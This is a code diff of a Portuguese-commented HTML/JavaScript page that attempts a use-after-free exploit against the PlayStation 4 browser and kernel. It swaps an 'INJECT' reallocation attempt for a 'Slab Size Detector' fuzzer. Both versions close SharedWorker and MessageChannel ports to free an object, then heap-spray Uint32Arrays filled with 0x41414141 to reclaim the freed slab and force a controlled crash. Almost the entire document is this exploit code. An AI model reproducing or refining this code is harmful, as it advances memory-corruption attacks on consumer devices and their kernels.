@@ -2,95 +2,75 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>PS4 UAF - Reallocation Attempt</title>
-    <style>body{background:#222;color:#fff;font-family:monospace;text-align:center;margin-top:20%;}</style>
+    <title>Slab Size Detector</title>
+    <style>body{background:#111;color:#0f0;font-family:monospace;padding:20px;}</style>
 </head>
 <body>
-    <h1>UAF: Free & Reclaim Strategy</h1>
-    <div id="status">Waiting...</div>
-    <button onclick="startExploit()" style="padding:20px;font-size:20px;cursor:pointer;">INJECT</button>
+    <h2>1. Seletor de Tamanho (Slab Bucket)</h2>
+    <p>Escolha um tamanho. Se o crash for INSTANTÂNEO (ex: < 50 iterações), você achou o tamanho da struct.</p>
+    
+    <label>Tamanho do Objeto de Spray (Bytes):</label>
+    <select id="sizeSel">
+        <option value="32">32 bytes</option>
+        <option value="48">48 bytes</option>
+        <option value="64">64 bytes</option>
+        <option value="96">96 bytes</option>
+        <option value="128">128 bytes (Comum)</option>
+        <option value="192">192 bytes</option>
+        <option value="256">256 bytes</option>
+        <option value="512">512 bytes</option>
+        <option value="1024">1024 bytes</option>
+    </select>
+    <br><br>
+    <button onclick="run()">INICIAR FUZZING</button>
+    <div id="log">Iter: 0</div>
 
     <script>
-        // CONFIGURAÇÃO
-        // Tamanhos comuns de structs no FreeBSD/PS4 (em bytes)
-        // Precisamos tentar acertar o tamanho do bucket do alocador (UMA/Slab)
-        const TARGET_SIZES = [32, 48, 64, 96, 128, 192, 256];
-        
-        let workerBlob = null;
-
-        function log(msg) { document.getElementById('status').innerText = msg; }
-
-        // Cria dados falsos para preencher a memória
-        function prepareSprayPayloads() {
-            let payloads = {};
-            for (let size of TARGET_SIZES) {
-                // Criamos um buffer preenchido com 0x41414141 (AAAA)
-                // Se o kernel tentar executar isso como ponteiro, vai pular para 0x41414141 -> Crash Controlado
-                let buf = new Uint32Array(size / 4);
-                buf.fill(0x41414141);
-                payloads[size] = buf;
-            }
-            return payloads;
-        }
-
-        async function startExploit() {
-            log("Preparando Payloads...");
-            const sprays = prepareSprayPayloads();
-            
-            // Worker simples apenas para segurar a conexão
-            const blobCode = `onmessage = (e) => { e.ports[0].postMessage('PONG'); }`;
-            const url = URL.createObjectURL(new Blob([blobCode], {type:'text/javascript'}));
-            
+        async function run() {
+            const size = parseInt(document.getElementById('sizeSel').value);
+            const el = document.getElementById('log');
             let i = 0;
-            
-            log("Iniciando Race...");
+
+            // Criamos arrays tipados que se alinhem com o alocador do sistema
+            // Uint32Array usa 4 bytes por elemento.
+            const elementCount = size / 4; 
+
+            // Worker Mínimo
+            const blob = new Blob([`onmessage=e=>{}`], {type:'text/javascript'});
+            const url = URL.createObjectURL(blob);
 
             while(true) {
                 i++;
-                if(i % 50 === 0) log(`Tentativa: ${i} (Buscando colisão)`);
-                
-                // Pequeno delay para UI
+                el.innerText = `Size: ${size} | Iter: ${i}`;
                 await new Promise(r => setTimeout(r, 5));
 
-                await runCycle(url, sprays);
-            }
-        }
+                await new Promise(resolve => {
+                    const mc = new MessageChannel();
+                    const sw = new SharedWorker(url, `fuzz_${size}_${i}`);
+                    sw.port.start();
+                    sw.port.postMessage("init", [mc.port2]);
 
-        function runCycle(url, sprays) {
-            return new Promise((resolve) => {
-                const mc = new MessageChannel();
-                const sw = new SharedWorker(url, "uaf_" + Math.random());
-                sw.port.start();
-                sw.port.postMessage("init", [mc.port2]);
-
-                // O GATILHO
-                setTimeout(() => {
-                    // 1. FREE: Libera o objeto do Kernel
-                    sw.port.close();
-                    mc.port1.close();
-
-                    // 2. RECLAIM (A mágica): Tenta alocar imediatamente em cima
-                    // Usamos history.pushState ou Arrays para forçar alocação no Kernel
-                    // Nota: ArrayBuffer puro às vezes fica em userland, mas Strings grandes
-                    // ou atributos de DOM podem ir para o Kernel. 
-                    
-                    // Tentativa de Spray Rápido
-                    let junk = [];
-                    for(let k=0; k<100; k++) {
-                        // Tenta criar arrays tipados que podem cair no mesmo SLAB do kernel
-                        junk.push(new Uint32Array(16)); // 64 bytes
-                        junk.push(new Uint32Array(32)); // 128 bytes
-                    }
-
-                    // 3. USE: O Worker (ou o sistema) tenta acessar a porta fechada
-                    // Se o timing for perfeito, ele acessa o 'junk' achando que é a porta.
-                    
                     setTimeout(() => {
-                        junk = null; // Limpa para a próxima tentativa
-                        resolve();
-                    }, 5); 
-                }, 2); // Janela crítica de tempo
-            });
+                        // 1. FREE
+                        sw.port.close();
+                        mc.port1.close();
+
+                        // 2. SPRAY IMEDIATO (Tentando ocupar o espaço exato)
+                        // Criamos 64 objetos do tamanho escolhido para tentar "cair no buraco"
+                        let spray = [];
+                        for(let k=0; k<64; k++) {
+                            let arr = new Uint32Array(elementCount);
+                            arr.fill(0x41414141);
+                            spray.push(arr);
+                        }
+
+                        setTimeout(() => {
+                            spray = null; // Limpa
+                            resolve();
+                        }, 5);
+                    }, 2);
+                });
+            }
         }
     </script>
 </body>
